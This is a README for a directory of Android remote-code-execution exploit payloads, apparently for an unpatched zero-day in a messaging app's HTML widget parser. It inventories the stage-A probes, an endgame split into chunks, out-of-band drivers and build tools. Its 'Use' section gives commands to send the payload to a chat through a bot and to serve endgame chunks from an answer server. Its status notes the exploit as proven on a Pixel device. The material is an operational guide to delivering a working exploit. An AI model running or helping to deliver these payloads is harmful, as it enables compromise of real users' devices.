# Android same-tag payloads (route 2)

Docs: `vulns/0day-2-RCE-PARSER-SCOPE/STAG/README.md`. Shared bot server:
`bot/answer_server.py`.

## Files

| File | Raw | zlib9 | What |
|---|---:|---:|---|
| `stage-a-probe-72801.html` | 1,566 | 686 | Device-proven stage A probe. |
| `src/stage-a-device-72801.js` | - | - | Stage-A source used by the probe. |
| `src/stage-a-v3.js` | - | - | Stage A v3 (GC priming, NP=4000/NQ=2600). |
| `inline-endgame-72801.html` | 9,186 | 3,883 | v3 + inline endgame (host-proven). |
| `inline-endgame-host.html` | 16,865 | - | Host twin. |
| `out-of-band-72801.html` | 2,151 | 1,024 | Stage A + fetch driver. |
| `out-of-band-burst-72801.html` | 2,151 | 1,025 | Stage A + burst driver. |
| `out-of-band-host-mock.html` | 18,011 | - | Host mock. |
| `endgame-72801.js` | 7,469 | - | The dynamic endgame (release proof path). |
| `endgame-host.js` | 15,148 | - | Host endgame. |
| `driver-out-of-band.js` | 1,636 | - | 5.2 s-pacing driver. |
| `driver-out-of-band-burst.js` | 1,636 | - | Burst driver. |
| `chunks/E0.txt` … `E7.txt` | 950×7 + 819 | - | The endgame split. |
| `chunks/manifest.json` | - | - | Lengths and per-chunk SHA-256. |
| `limits-probe-72801.html` | 2,833 | 1,320 | Answer-limit probe (P0-P8). |
| `tools/verify-72801.py` | - | - | Verify the 72801 lib and payload sizes. |
| `tools/build-stage-a-probe.py` | - | - | Rebuild the probe. |
| `design.md` | - | - | Original design notes (lab paths). |
| `runbook.md` | - | - | Original live-run notes (lab paths). |
| `design-route2.md` | - | - | Original route-2 README (lab paths). |

The last three are historical engineering notes. Their internal paths refer to
the original lab tree; the current paths are in this README and in the docs.

## Use

```sh
export BOT_TOKEN='…'
python3 bot/send_widget.py \
  --html vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/route2/inline-endgame-72801.html \
  --chat-id <chat id> \
  --allow-queries --background-query
```

For the out-of-band path:

```sh
python3 bot/answer_server.py \
  --uid <your user id> \
  --chunks vulns/0day-2-RCE-PARSER-SCOPE/STAG/payloads/route2/chunks \
  --state-dir /tmp/opencode/oob-state
```

Then send `out-of-band-72801.html` and keep the widget visible.

## Status

- Pixel 72801: stage A proven (`S1 ABLEN[599]=327744 VLEN=327744 END=-`).
- Out-of-band endgame: `HF HF OK`.
- Inline v3: host-proven, device-pending.
